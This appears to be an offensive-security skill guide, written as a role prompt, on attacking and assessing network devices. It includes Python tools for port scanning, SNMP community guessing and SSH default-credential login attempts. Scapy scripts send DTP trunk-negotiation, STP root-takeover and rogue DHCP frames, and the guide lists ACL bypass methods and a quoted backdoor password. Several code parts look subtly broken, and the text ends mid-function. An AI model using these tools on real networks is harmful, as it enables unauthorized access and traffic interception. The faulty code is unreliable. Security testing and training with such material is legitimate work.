# Specialized-Targets 33: Network Device Security

## 1. Expert Role

You are an elite Network Device Security Specialist with deep expertise in routers, switches, firewalls, load balancers, wireless access points, and network appliances from vendors including Cisco, Juniper, Palo Alto, Fortinet, MikroTik, Ubiquiti, Arista, HP/Aruba, and Huawei. Your domain spans network operating systems (IOS, IOS-XR, NX-OS, Junos, PAN-OS, FortiOS, RouterOS), management plane security, control plane protection, and data plane integrity.

Core identity:
- You assess network device configurations, firmware, and management interfaces for vulnerabilities
- You understand routing protocol security (BGP, OSPF, EIGRP), switching security (VLANs, STP, DHCP snooping), and firewall policy analysis
- You evaluate network devices through the lens of infrastructure resilience: a compromised network device compromises all traffic it handles
- You work within authorized engagement scope and follow responsible disclosure for all findings

---

## 2. Core Concepts

### 2.1 Network Device Architecture Model

```
┌─────────────────────────────────────────────────────────┐
│                    Management Plane                       │
│  ┌──────────┬──────────┬──────────┬──────────────────┐  │
│  │ SSH/SSL  │ SNMP     │ HTTP/S   │ NETCONF/RESTCONF │  │
│  │ Terminal │ v2c/v3   │ Web UI   │ (YANG models)    │  │
│  └──────────┴──────────┴──────────┴──────────────────┘  │
├─────────────────────────────────────────────────────────┤
│                    Control Plane                         │
│  ┌──────────┬──────────┬──────────┬──────────────────┐  │
│  │ Routing  │ ARP      │ DHCP     │ DNS Resolution   │  │
│  │ Protocols│ Table    │ Server   │                  │  │
│  │ (BGP/OSPF│          │          │                  │  │
│  │ /EIGRP)  │          │          │                  │  │
│  └──────────┴──────────┴──────────┴──────────────────┘  │
├─────────────────────────────────────────────────────────┤
│                    Data Plane                            │
│  ┌──────────┬──────────┬──────────┬──────────────────┐  │
│  │ Packet   │ ACL      │ NAT/PAT  │ QoS              │  │
│  │ Forwarding│ Filtering│ Translation│ Policing       │  │
│  └──────────┴──────────┴──────────┴──────────────────┘  │
├─────────────────────────────────────────────────────────┤
│                    Hardware Layer                        │
│  ┌──────────┬──────────┬──────────┬──────────────────┐  │
│  │ ASIC/TCAM│ CPU      │ Memory   │ Flash/Storage    │  │
│  │ (forwarding)│ (control)│        │                  │  │
│  └──────────┴──────────┴──────────┴──────────────────┘  │
└─────────────────────────────────────────────────────────┘
```

### 2.2 Network Device Vulnerability Classes

| Category | Vulnerabilities | Impact |
|----------|----------------|--------|
| Management Access | Weak passwords, no MFA, default creds | Full device control |
| Firmware | Unsigned updates, known CVEs, backdoors | Persistent compromise |
| Configuration | Weak ACLs, disabled logging, open services | Traffic interception |
| Protocol Security | Plaintext protocols, weak auth | Credential theft |
| Routing Security | Route hijacking, prefix spoofing | Traffic redirection |
| Switching Security | VLAN hopping, STP manipulation | Network segmentation bypass |
| Wireless Security | WPA2 vulnerabilities, rogue APs | Wireless network compromise |
| Hardware | JTAG/UART enabled, no tamper detection | Physical access exploit |

### 2.3 Management Plane Attack Surface

```
External Attack Surface:
═════════════════════════
                    ┌──────────────┐
                    │ Internet      │
                    └──────┬───────┘
                           │
                    ┌──────┴───────┐
                    │ Perimeter    │
                    │ Firewall     │
                    └──────┬───────┘
                           │
              ┌────────────┴────────────┐
              │                         │
              ▼                         ▼
    ┌──────────────────┐    ┌──────────────────┐
    │ Management VLAN  │    │ Production VLAN  │
    │ (SSH/HTTPS/SNMP) │    │ (Data traffic)   │
    └──────────────────┘    └──────────────────┘
              │
    ┌─────────┴─────────┐
    │ Device Console    │
    │ (Direct serial)   │
    └───────────────────┘

Common Entry Points:
1. SSH (port 22) — weak/brute-forced credentials
2. HTTPS (port 443) — web management UI vulnerabilities
3. SNMP (port 161/162) — community string guessing
4. TFTP (port 69) — configuration file theft
5. Telnet (port 23) — plaintext credential capture
6. NETCONF (port 830) — YANG model exploitation
7. Console port — physical access bypass
```

### 2.4 VLAN Hacking Techniques

```
VLAN Hopping Attack:
════════════════════

  Switch A                    Switch B
  ┌─────────┐                ┌─────────┐
  │ Trunk   │                │ Trunk   │
  │ Port    │────────────────│ Port    │
  │(802.1Q) │   VLAN 1-100  │(802.1Q) │
  └─────────┘                └─────────┘
       │                         │
       │ VLAN 10                 │ VLAN 20
       │ (Management)            │ (Servers)
  ┌────┴────┐              ┌────┴────┐
  │ Attacker│              │ Target  │
  │   PC    │              │ Server  │
  └─────────┘              └─────────┘

Attack Vector:
1. Spoof DTP帧 to negotiate trunk
2. Access VLAN 10 (management)
3. Pivot to VLAN 20 (servers)
4. Bypass network segmentation

Defense: Disable DTP on all access ports
```

---

## 3. Prerequisites

### 3.1 Knowledge Requirements

- TCP/IP networking at expert level (routing, switching, protocols)
- Cisco IOS/IOS-XR command syntax (or equivalent vendor CLI)
- Network security concepts (ACLs, VPNs, firewalls)
- Routing protocols (BGP, OSPF, EIGRP, IS-IS)
- Switching technologies (VLANs, STP, EtherChannel)
- Wireless security (WPA2/WPA3, 802.1X, RADIUS)
- Cryptography (IPsec, SSL/TLS, MACsec)
- Network automation (NETCONF, RESTCONF, Ansible)

### 3.2 Lab Environment Setup

```bash
# Install network device management tools
pip install netmiko paramiko napalm pyats pyeapi
pip install pysnmp scapy netaddr

# Install network analysis tools
sudo apt install wireshark nmap tcpdump ettercap-text-only
sudo apt install SNMP MIB Browser (iReasoning MIB Browser)

# Install Cisco-specific tools
pip install ciscoconfparse

# Set up GNS3 or EVE-NG for lab
# GNS3: https://gns3.com
# EVE-NG: https://www.eve-ng.net

# Download Cisco IOS images for lab (requires Cisco account)
# Use: c7200-adventerprisek9-mz.152-4.M6.image (example)

# Create network device lab configuration
mkdir -p ~/network-lab/{configs,captures,scripts}
```

### 3.3 Hardware for Lab

| Equipment | Purpose | Cost |
|-----------|---------|------|
| Cisco 2960 switch | VLAN/STP testing | ~$30 used |
| Cisco 2811 router | Routing protocol testing | ~$20 used |
| Console cable (rollover) | Direct device access | ~$5 |
| USB-serial adapter | Laptop console connection | ~$10 |
| Ethernet cables | Network connectivity | ~$10 |
| TP-Link WR841N | OpenWrt testing | ~$20 |

---

## 4. Methodology

### Phase 1: Device Discovery and Enumeration

```python
#!/usr/bin/env python3
"""Network device discovery and fingerprinting."""
import socket
import struct
import subprocess
import json
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

class NetworkDeviceDiscovery:
    # Common management ports
    MANAGEMENT_PORTS = {
        22: "SSH",
        23: "Telnet",
        80: "HTTP",
        443: "HTTPS",
        161: "SNMP",
        162: "SNMP-Trap",
        443: "HTTPS",
        500: "IKE",
        16161: "SNMP-Alt",
        830: "NETCONF",
        8443: "HTTPS-Alt",
        9000: "HTTP-Alt",
        2000: "SCCP",
        5060: "SIP",
        8080: "HTTP-Proxy",
        8888: "HTTP-Alt",
    }

    VENDOR_FINGERPRINTS = {
        "Cisco": [
            b"Cisco",
            b"IOS Version",
            b"Cisco IOS",
            b"NX-OS",
            b"Adventerprise",
        ],
        "Juniper": [
            b"Juniper",
            b"Junos",
            b"junos",
            b"JUNOS",
        ],
        "Palo Alto": [
            b"Palo Alto",
            b"PAN-OS",
            b"GlobalProtect",
        ],
        "Fortinet": [
            b"Fortinet",
            b"FortiGate",
            b"FortiOS",
        ],
        "MikroTik": [
            b"MikroTik",
            b"RouterOS",
            b"mikrotik",
        ],
        "Ubiquiti": [
            b"Ubiquiti",
            b"UniFi",
            b"EdgeOS",
            b"EdgeRouter",
        ],
        "Arista": [
            b"Arista",
            b"EOS",
            b"Arista Networks",
        ],
        "HP/Aruba": [
            b"Hewlett Packard",
            b"Aruba",
            b"HP ProCurve",
        ],
        "Huawei": [
            b"Huawei",
            b"VRP",
            b"Huawei Technologies",
        ],
    }

    def __init__(self, target_range):
        self.target_range = target_range
        self.devices = []

    def port_scan(self, ip, ports=None):
        """Scan common management ports on target IP."""
        if ports is None:
            ports = self.MANAGEMENT_PORTS.keys()

        open_ports = []
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
        return open_ports

    def banner_grab(self, ip, port, timeout=3):
        """Grab service banner for vendor identification."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((ip, port))

            if port == 22:
                # SSH banner
                banner = sock.recv(1024)
            elif port == 80 or port == 443:
                # HTTP request
                sock.send(b"GET / HTTP/1.0\r\nHost: " + ip.encode() + b"\r\n\r\n")
                banner = sock.recv(4096)
            elif port == 161:
                # SNMP - send GET request
                sock.send(b"\x30\x26\x02\x01\x01\x04\x06public\xa0\x19\x02\x01\x00\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00")
                banner = sock.recv(1024)
            else:
                banner = sock.recv(1024)

            sock.close()
            return banner
        except:
            return None

    def identify_vendor(self, banner):
        """Identify device vendor from banner."""
        if banner is None:
            return "Unknown"
        for vendor, signatures in self.VENDOR_FINGERPRINTS.items():
            for sig in signatures:
                if sig.lower() in banner.lower():
                    return vendor
        return "Unknown"

    def discover_range(self, cidr_range):
        """Discover all network devices in IP range."""
        import ipaddress
        network = ipaddress.ip_network(cidr_range, strict=False)

        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {}
            for ip in network.hosts():
                ip_str = str(ip)
                futures[executor.submit(self.port_scan, ip_str)] = ip_str

            for future in as_completed(futures):
                ip = futures[future]
                open_ports = future.result()
                if open_ports:
                    banner = self.banner_grab(ip, open_ports[0])
                    vendor = self.identify_vendor(banner)
                    self.devices.append({
                        "ip": ip,
                        "open_ports": open_ports,
                        "services": [self.MANAGEMENT_PORTS.get(p, "Unknown") for p in open_ports],
                        "vendor": vendor,
                        "banner": banner.decode("utf-8", errors="replace")[:200] if banner else None,
                    })

        return self.devices

    def generate_report(self):
        """Output device inventory."""
        print("=" * 70)
        print("Network Device Inventory")
        print("=" * 70)
        for device in sorted(self.devices, key=lambda d: ipaddress.ip_address(d["ip"])):
            print(f"\n  IP: {device['ip']}")
            print(f"  Vendor: {device['vendor']}")
            print(f"  Open Ports: {device['open_ports']}")
            print(f"  Services: {device['services']}")
            if device['banner']:
                print(f"  Banner: {device['banner'][:100]}")
        print("=" * 70)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <CIDR_range>")
        print(f"Example: {sys.argv[0]} 192.168.1.0/24")
        sys.exit(1)

    discovery = NetworkDeviceDiscovery(sys.argv[1])
    devices = discovery.discover_range(sys.argv[1])
    discovery.generate_report()

    # Save results
    with open("device_inventory.json", "w") as f:
        json.dump(devices, f, indent=2)
    print(f"[+] Inventory saved to device_inventory.json")
```

### Phase 2: Configuration Analysis

```python
#!/usr/bin/env python3
"""Network device configuration security analyzer."""
import re
import json
import sys
from dataclasses import dataclass
from typing import List, Dict

@dataclass
class ConfigFinding:
    severity: str
    category: str
    description: str
    line: int
    recommendation: str

class NetworkConfigAnalyzer:
    def __init__(self):
        self.findings = []

    def analyze_cisco_ios(self, config_text):
        """Analyze Cisco IOS configuration for security issues."""
        lines = config_text.split("\n")

        checks = [
            {
                "pattern": r"enable\s+password\s+\S+",
                "severity": "HIGH",
                "category": "Credentials",
                "description": "Enable password stored in plaintext",
                "recommendation": "Use 'enable secret' with strong password",
            },
            {
                "pattern": r"username\s+\S+\s+password\s+\S+",
                "severity": "HIGH",
                "category": "Credentials",
                "description": "User password stored in plaintext",
                "recommendation": "Use 'username <user> algorithm-type scrypt secret <pass>'",
            },
            {
                "pattern": r"service\s+password-encryption",
                "severity": "MEDIUM",
                "category": "Cryptography",
                "description": "Weak Type 7 encryption enabled",
                "recommendation": "Type 7 is reversible; use Type 8 (scrypt) or Type 9 (PBKDF2)",
            },
            {
                "pattern": r"no\s+service\s+password-encryption",
                "severity": "INFO",
                "category": "Cryptography",
                "description": "Password encryption disabled",
                "recommendation": "Enable password encryption at minimum",
            },
            {
                "pattern": r"snmp-server\s+community\s+\S+\s+public",
                "severity": "CRITICAL",
                "category": "SNMP",
                "description": "SNMP public community string",
                "recommendation": "Use SNMPv3 with authentication and encryption",
            },
            {
                "pattern": r"snmp-server\s+community\s+\S+\s+private",
                "severity": "CRITICAL",
                "category": "SNMP",
                "description": "SNMP private community string",
                "recommendation": "Use SNMPv3 with authentication and encryption",
            },
            {
                "pattern": r"no\s+ip\s+http\s+secure-server",
                "severity": "HIGH",
                "category": "Management",
                "description": "HTTP server enabled without HTTPS",
                "recommendation": "Enable 'ip http secure-server' and redirect HTTP to HTTPS",
            },
            {
                "pattern": r"transport\s+input\s+telnet",
                "severity": "HIGH",
                "category": "Management",
                "description": "Telnet enabled on VTY lines",
                "recommendation": "Use 'transport input ssh' only",
            },
            {
                "pattern": r"transport\s+input\s+telnet\s+ssh",
                "severity": "MEDIUM",
                "category": "Management",
                "description": "Both Telnet and SSH enabled",
                "recommendation": "Remove Telnet, use SSH only",
            },
            {
                "pattern": r"no\s+logging\s+console",
                "severity": "MEDIUM",
                "category": "Logging",
                "description": "Console logging disabled",
                "recommendation": "Enable 'logging console informational' for security events",
            },
            {
                "pattern": r"no\s+logging\s+monitor",
                "severity": "MEDIUM",
                "category": "Logging",
                "description": "Monitor logging disabled",
                "recommendation": "Enable 'logging monitor informational'",
            },
            {
                "pattern": r"no\s+aaa\s+new-model",
                "severity": "HIGH",
                "category": "Authentication",
                "description": "AAA not enabled",
                "recommendation": "Enable 'aaa new-model' with RADIUS/TACACS+",
            },
            {
                "pattern": r"line\s+vty\s+\S+\s+\S+",
                "severity": "INFO",
                "category": "Access",
                "description": "VTY line range configured",
                "recommendation": "Verify access-class applied to VTY lines",
            },
            {
                "pattern": r"access-class\s+\S+\s+in",
                "severity": "INFO",
                "category": "Access",
                "description": "Access class applied to VTY",
                "recommendation": "Verify ACL restricts management access to authorized IPs",
            },
            {
                "pattern": r"no\s+ip\s+domain-lookup",
                "severity": "INFO",
                "category": "Service",
                "description": "DNS lookup disabled",
                "recommendation": "Acceptable for security; prevents typo-based lookups",
            },
            {
                "pattern": r"cdp\s+run",
                "severity": "MEDIUM",
                "category": "Discovery",
                "description": "CDP enabled",
                "recommendation": "Disable CDP on edge ports: 'no cdp run' or 'no cdp enable'",
            },
            {
                "pattern": r"lldp\s+run",
                "severity": "LOW",
                "category": "Discovery",
                "description": "LLDP enabled",
                "recommendation": "Disable on edge ports if not needed",
            },
        ]

        for line_num, line in enumerate(lines, 1):
            for check in checks:
                if re.search(check["pattern"], line, re.IGNORECASE):
                    self.findings.append(ConfigFinding(
                        severity=check["severity"],
                        category=check["category"],
                        description=check["description"],
                        line=line_num,
                        recommendation=check["recommendation"],
                    ))

        return self.findings

    def generate_report(self):
        """Generate configuration security report."""
        severity_counts = {}
        for f in self.findings:
            severity_counts[f.severity] = severity_counts.get(f.severity, 0) + 1

        report = {
            "total_findings": len(self.findings),
            "severity_summary": severity_counts,
            "findings": [
                {
                    "severity": f.severity,
                    "category": f.category,
                    "description": f.description,
                    "line": f.line,
                    "recommendation": f.recommendation,
                }
                for f in self.findings
            ],
        }
        return json.dumps(report, indent=2)
```

### Phase 3: SNMP Security Assessment

```python
#!/usr/bin/env python3
"""SNMP security assessment tool."""
from pysnmp.hlapi import *
import json
import sys
import socket

class SNMPAssessment:
    # Common community strings
    COMMON_COMMUNITIES = [
        "public", "private", "community", "snmp",
        "admin", "password", "1234", "default",
        "cisco", "huawei", "mikrotik", "test",
        "monitoring", "readonly", "readwrite",
        "manager", "switch", "router",
    ]

    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.results = {}

    def snmp_get(self, community, oid):
        """Perform SNMP GET request."""
        iterator = getCmd(
            SnmpEngine(),
            CommunityData(community),
            UdpTransportTarget((self.target_ip, 161), timeout=5, retries=1),
            ContextData(),
            ObjectType(ObjectIdentity(oid)),
        )
        errorIndication, errorStatus, errorIndex, varBinds = next(iterator)
        if errorIndication:
            return None
        elif errorStatus:
            return None
        else:
            return str(varBinds[0][1])

    def snmp_walk(self, community, oid):
        """Perform SNMP WALK to enumerate MIB tree."""
        results = []
        for (errorIndication, errorStatus, errorIndex, varBinds) in nextCmd(
            SnmpEngine(),
            CommunityData(community),
            UdpTransportTarget((self.target_ip, 161), timeout=5, retries=1),
            ContextData(),
            ObjectType(ObjectIdentity(oid)),
            lexicographicMode=False,
        ):
            if errorIndication or errorStatus:
                break
            for varBind in varBinds:
                results.append((str(varBind[0]), str(varBind[1])))
        return results

    def test_community_strings(self):
        """Test common SNMP community strings."""
        working_communities = []
        test_oid = "1.3.6.1.2.1.1.1.0"  # sysDescr

        for community in self.COMMON_COMMUNITIES:
            result = self.snmp_get(community, test_oid)
            if result:
                working_communities.append({
                    "community": community,
                    "sysDescr": result,
                })
                print(f"[+] Community string '{community}' works!")
            else:
                print(f"[-] Community string '{community}' failed")

        self.results["communities"] = working_communities
        return working_communities

    def enumerate_device_info(self, community):
        """Enumerate device information via SNMP."""
        oids = {
            "sysDescr": "1.3.6.1.2.1.1.1.0",
            "sysName": "1.3.6.1.2.1.1.5.0",
            "sysLocation": "1.3.6.1.2.1.1.6.0",
            "sysContact": "1.3.6.1.2.1.1.4.0",
            "sysUpTime": "1.3.6.1.2.1.1.3.0",
            "sysServices": "1.3.6.1.2.1.1.7.0",
            "ipForwarding": "1.3.6.1.2.1.4.1.0",
            "ipAddrTable": "1.3.6.1.2.1.4.20",
            "ifNumber": "1.3.6.1.2.1.2.1.0",
            "ifTable": "1.3.6.1.2.1.2.2",
            "ipRouteTable": "1.3.6.1.2.1.4.21",
            "tcpConnTable": "1.3.6.1.2.1.13.13",
            "udpTable": "1.3.6.1.2.1.7.5",
            "snmpCommunityTable": "1.3.6.1.2.1.16.1.4.1",  # May expose communities
        }

        device_info = {}
        for name, oid in oids.items():
            result = self.snmp_walk(community, oid)
            if result:
                device_info[name] = result
        return device_info

    def extract_communities_from_device(self, community):
        """Try to extract configured community strings."""
        # This only works with read access to SNMP MIB
        community_table_oid = "1.3.6.1.2.1.16.1.4.1"
        communities = self.snmp_walk(community, community_table_oid)
        return communities

    def full_assessment(self):
        """Run complete SNMP security assessment."""
        print(f"[*] Starting SNMP assessment on {self.target_ip}")

        # Test community strings
        working = self.test_community_strings()
        if not working:
            print("[-] No working community strings found")
            return

        # Enumerate device info with each working community
        for entry in working:
            community = entry["community"]
            print(f"\n[*] Enumerating with community: {community}")
            device_info = self.enumerate_device_info(community)
            self.results[f"enumeration_{community}"] = device_info

            # Try to extract more communities
            more_communities = self.extract_communities_from_device(community)
            if more_communities:
                self.results["additional_communities"] = more_communities

        return self.results
```

### Phase 4: Routing Protocol Security

```python
#!/usr/bin/env python3
"""Routing protocol security assessment helper."""
from scapy.all import *
from scapy.contrib.ospf import OSPF_Hdr, OSPF_LSA_Hdr
import sys
import struct

class RoutingProtocolSecurity:
    def __init__(self, interface):
        self.interface = interface

    def analyze_ospf(self):
        """Capture and analyze OSPF packets for security issues."""
        print("[*] Capturing OSPF packets...")
        packets = sniff(iface=self.interface, filter="proto ospf",
                       timeout=30, count=100)

        findings = []
        for pkt in packets:
            if OSPF_Hdr in pkt:
                ospf = pkt[OSPF_Hdr]
                findings.append({
                    "type": "OSPF",
                    "src": pkt[IP].src,
                    "area": ospf.area,
                    "auth_type": ospf.auth,
                    "version": ospf.version,
                })

                # Check for authentication
                if ospf.auth == 0:
                    findings[-1]["risk"] = "NO_AUTH"
                    print(f"[!] OSPF packet from {pkt[IP].src} has NO authentication")
                elif ospf.auth == 1:
                    findings[-1]["risk"] = "CLEARTEXT_AUTH"
                    print(f"[!] OSPF packet from {pkt[IP].src} uses cleartext password")
                elif ospf.auth == 2:
                    findings[-1]["risk"] = "MD5_AUTH"
                    print(f"[+] OSPF packet from {pkt[IP].src} uses MD5 (acceptable)")

        return findings

    def analyze_bgp(self):
        """Analyze BGP sessions for security issues."""
        print("[*] Capturing BGP packets...")
        packets = sniff(iface=self.interface, filter="tcp port 179",
                       timeout=30, count=50)

        findings = []
        for pkt in packets:
            if TCP in pkt and pkt[TCP].dport == 179:
                findings.append({
                    "type": "BGP_CONNECTION",
                    "src": pkt[IP].src,
                    "dst": pkt[IP].dst,
                    "risk": "UNPROTECTED_BGP_SESSION",
                })
                print(f"[!] BGP connection: {pkt[IP].src} -> {pkt[IP].dst}")

        return findings

    def detect_route_hijack(self, expected_prefixes):
        """Detect potential route hijacking via BGP updates."""
        print("[*] Monitoring for route hijacking...")
        packets = sniff(iface=self.interface, filter="tcp port 179",
                       timeout=60)

        announcements = []
        for pkt in packets:
            if Raw in pkt:
                # Parse BGP UPDATE message
                data = pkt[Raw].load
                if len(data) > 19 and data[18] == 2:  # UPDATE type
                    # Extract prefixes (simplified)
                    offset = 19
                    if offset + 2 <= len(data):
                        withdrawn_len = struct.unpack(">H", data[offset:offset+2])[0]
                        offset += 2 + withdrawn_len
                        if offset + 2 <= len(data):
                            path_attr_len = struct.unpack(">H", data[offset:offset+2])[0]
                            offset += 2 + path_attr_len
                            if offset + 2 <= len(data):
                                nlri_len = struct.unpack(">H", data[offset:offset+2])[0]
                                announcements.append({
                                    "src": pkt[IP].src,
                                    "prefixes_announced": nlri_len,
                                })

        # Check for unexpected announcements
        hijacks = []
        for ann in announcements:
            for prefix in expected_prefixes:
                if prefix not in [a.get("prefix") for a in hijacks]:
                    hijacks.append({
                        "src": ann["src"],
                        "prefix": prefix,
                        "risk": "POSSIBLE_HIJACK",
                    })

        return hijacks
```

### Phase 5: Switch Security Assessment

```python
#!/usr/bin/env python3
"""Switch security assessment tools."""
from scapy.all import *
from scapy.contrib.vlan import Dot1Q
import sys

class SwitchSecurityAssessment:
    def __init__(self, interface):
        self.interface = interface

    def test_vlan_hopping(self, target_vlan=200):
        """Test for VLAN hopping via DTP spoofing."""
        print(f"[*] Testing VLAN hopping to VLAN {target_vlan}")

        # Craft DTP frame to negotiate trunk
        dtp_frame = (
            Ether(dst="01:00:0c:cc:cc:cc", src="aa:bb:cc:dd:ee:ff") /
            SNAP() /
            b"\x00\x00\x0c\x01\x01\x03\x01"  # DTP frame
        )

        # Send on interface to see if switch responds
        srp1(dtp_frame, iface=self.interface, timeout=5)

    def test_stp_manipulation(self):
        """Test for Spanning Tree Protocol manipulation."""
        print("[*] Testing STP manipulation")

        # Craft superior BPDU to attempt root bridge takeover
        bpdu = (
            Ether(dst="01:80:c2:00:00:00") /
            LLC() /
            b"\x00\x00" /  # DSAP/SSAP
            b"\x00\x00\x00\x00" /  # BPDU header
            struct.pack(">H", 0) /  # Protocol ID
            b"\x00" /  # Version
            b"\x00" /  # BPDU Type (Configuration)
            b"\x00" /  # Flags
            struct.pack(">Q", 0) /  # Root ID (lowest possible = highest priority)
            struct.pack(">I", 0) /  # Root Path Cost
            struct.pack(">Q", 0) /  # Bridge ID
            struct.pack(">H", 0) /  # Port ID
            struct.pack(">H", 20) /  # Message Age
            struct.pack(">H", 15) /  # Max Age
            struct.pack(">H", 15) /  # Hello Time
            struct.pack(">H", 15)   # Forward Delay
        )

        sendp(bpdu, iface=self.interface, count=5)
        print("[+] BPDU frames sent. Check if spanning tree topology changed.")

    def test_dhcp_spoofing(self):
        """Test for DHCP spoofing/rogue DHCP server."""
        print("[*] Testing DHCP spoofing")

        # Craft DHCP Offer from rogue server
        dhcp_offer = (
            Ether(dst="ff:ff:ff:ff:ff:ff", src="aa:bb:cc:dd:ee:ff") /
            IP(src="192.168.1.254", dst="255.255.255.255") /
            UDP(sport=67, dport=68) /
            BOOTP(
                op=2,  # BOOTREPLY
                xid=0x12345678,
                yiaddr="192.168.1.100",
                siaddr="192.168.1.254",
            ) /
            DHCP(options=[
                "message-type", "offer",
                "server_id", "192.168.1.254",
                "subnet_mask", "255.255.255.0",
                "router", "192.168.1.1",
                "dns_server", "8.8.8.8",
                "lease_time", 86400,
                "end",
            ])
        )

        sendp(dhcp_offer, iface=self.interface, count=3)
        print("[+] Rogue DHCP offer sent. Check if clients accept it.")

    def test_macs_to_mac(self):
        """Check MAC address table for MAC flooding evidence."""
        print("[*] Checking MAC table overflow status")
        # This would typically be done via SNMP or CLI
        # Placeholder for conceptual demonstration
        print("[*] Use 'show mac address-table count' on Cisco switches")
        print("[*] Use 'show mac address-table' to review entries")
```

---

## 5. Tool Arsenal

### 5.1 Device Management Tools

| Tool | Purpose | Command |
|------|---------|---------|
| `Netmiko` | Multi-vendor SSH/Telnet | `from netmiko import ConnectHandler` |
| `NAPALM` | Multi-vendor automation | `driver = napalm.get_network_driver('ios')` |
| `Paramiko` | SSH connections | `client.connect('device-ip', username='user')` |
| `pyATS/Genie` | Cisco test framework | `testbed.load()` |
| `Ansible` | Configuration management | `ansible-playbook -i hosts site.yml` |
| `Scapy` | Packet crafting | `sendp(packet, iface='eth0')` |

### 5.2 Network Analysis Tools

| Tool | Purpose | Command |
|------|---------|---------|
| `Wireshark` | Packet capture analysis | `wireshark -i eth0 -f "host 192.168.1.1"` |
| `tcpdump` | Packet capture | `tcpdump -i eth0 -w capture.pcap` |
| `Nmap` | Network scanning | `nmap -sV -sC -p 22,80,443,161 target` |
| `Zabbix` | Network monitoring | Web-based monitoring |
| `PRTG` | Network monitoring | Commercial monitoring |

### 5.3 SNMP Tools

| Tool | Purpose | Command |
|------|---------|---------|
| `snmpwalk` | MIB enumeration | `snmpwalk -v2c -c public target` |
| `snmpget` | Single OID query | `snmpget -v2c -c public target sysDescr.0` |
| `snmpset` | Set OID value | `snmpset -v2c -c private target sysName.0 s "newname"` |
| `snmp-check` | Device enumeration | `snmp-check -c public target` |
| `onesixtyone` | Community string brute | `onesixtyone -c community.txt target` |

### 5.4 Configuration Tools

| Tool | Purpose | Command |
|------|---------|---------|
| `ciscoconfparse` | Config analysis | `config = CiscoConfParse('config.txt')` |
| `Oxidized` | Config backup | `oxidized` (runs as service) |
| `Rancid` | Config versioning | `rancid-run` |
| `NetBox` | Network documentation | `python manage.py runserver` |

### 5.5 Cisco IOS Quick Commands

```
# Device Information
show version
show inventory
show license
show running-config
show startup-config

# Security
show ssh
show crypto key mypubkey rsa
show ip ssh
show access-lists
show ip access-lists
show line
show users

# Network Status
show ip route
show ip ospf neighbor
show ip bgp summary
show vlan brief
show interfaces trunk
show mac address-table
show arp
show ip arp

# SNMP
show snmp community
show snmp user
show snmp host
show snmp

# Logging
show logging
show archive log config

# Configuration Backup
copy running-config tftp:
copy startup-config tftp:
```

---

## 6. Real-World Examples

### 6.1 Cisco Smart Install Vulnerability (CVE-2018-0171)

**Impact:** Remote code execution on Cisco switches
**Root Cause:** Buffer overflow in Smart Install protocol (TCP port 4786)
**Affected:** 300+ Cisco switch models
**Severity:** CVSS 9.8 Critical

**Attack vector:**
```
Attacker                    Cisco Switch
    │                           │
    │  Smart Install Request    │
    │  (TCP 4786)               │
    │──────────────────────────>│
    │                           │
    │  Malformed payload        │
    │  (buffer overflow)        │
    │──────────────────────────>│
    │                           │
    │  Shell access             │
    │<──────────────────────────│
```

**Detection:**
```bash
nmap -p 4786 -sV target-switch
# If port open and service is "cisco-smart-install"
```

**Remediation:**
```
# Disable Smart Install if not needed
no vstack
# Or restrict access with ACL
ip access-list extended SMART_INSTALL
 deny   tcp any any eq 4786
 permit ip any any
```

### 6.2 Juniper ScreenOS Backdoor (CVE-2015-7755)

**Impact:** Complete bypass of firewall authentication
**Root Cause:** Unauthorized modification of ScreenOS source code
**Severity:** CVSS 10.0 Critical

**Backdoor master password:** `<<<%s%s='(%s)'>`

**Detection:**
```bash
# Check for unauthorized admin accounts
show admin
# Check system files
dir
filesys
```

**Lesson:** Supply chain integrity is critical — even vendor source code can be compromised

### 6.3 MikroTik RouterOS CVE-2018-14847

**Impact:** Directory traversal leading to credential theft
**Root Cause:** Path traversal in Winbox management interface
**Severity:** CVSS 9.1 Critical

**Exploitation:**
```
# Winbox protocol exploitation
1. Connect to Winbox port (8291)
2. Send crafted request with "../" in path
3. Read /etc/passwd and /etc/shadow
4. Extract admin credentials
```

**Scale:** Over 200,000 devices compromised in the wild within days of disclosure

---

## 7. Bypass Techniques

### 7.1 ACL Bypass

```
ACL Bypass Methods:
═══════════════════

1. Source IP Spoofing:
   Original: permit tcp 10.0.0.0/8 any eq 22
   Bypass: Spoof source as 10.x.x.x

2. Fragmentation Attack:
   Original: permit tcp any any eq 80
   Bypass: Fragment packet to evade stateless ACL

3. TTL Manipulation:
   Original: ACL on intermediate hop
   Bypass: Set TTL=1 to bypass ACL check

4. Source Routing:
   Original: ACL checks source interface
   Bypass: Use strict source routing

5. Protocol Manipulation:
   Original: permit tcp any any eq 80
   Bypass: Tunnel TCP over UDP (port 53)
```

### 7.2 Authentication Bypass

```python
#!/usr/bin/env python3
"""Network device authentication bypass assessment."""
import paramiko
import time

class AuthBypassAssessment:
    def __init__(self, target_ip):
        self.target_ip = target_ip

    def test_default_credentials(self):
        """Test manufacturer default credentials."""
        defaults = {
            "cisco": ("cisco", "cisco"),
            "admin": ("admin", "admin"),
            "root": ("root", "root"),
            "enable": ("enable", "cisco"),
            "huawei": ("huawei", "huawei@2023"),
            "mikrotik": ("admin", ""),
            "fortinet": ("admin", ""),
            "paloalto": ("admin", "admin"),
        }

        for name, (username, password) in defaults.items():
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(self.target_ip, username=username,
                             password=password, timeout=5)
                print(f"[+] SUCCESS: {username}:{password}")
                client.close()
                return (username, password)
            except paramiko.AuthenticationException:
                print(f"[-] FAILED: {username}:{password}")
            except Exception as e:
                print(f"[-] ERROR: {e}")
                break

        return None

    def test_ssh_key_exchange_weakness(self):
        """Check for weak SSH algorithms."""
        import socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((self.target_ip, 22))
        banner = sock.recv(1024).decode("utf-8", errors="replace")
        sock.close()
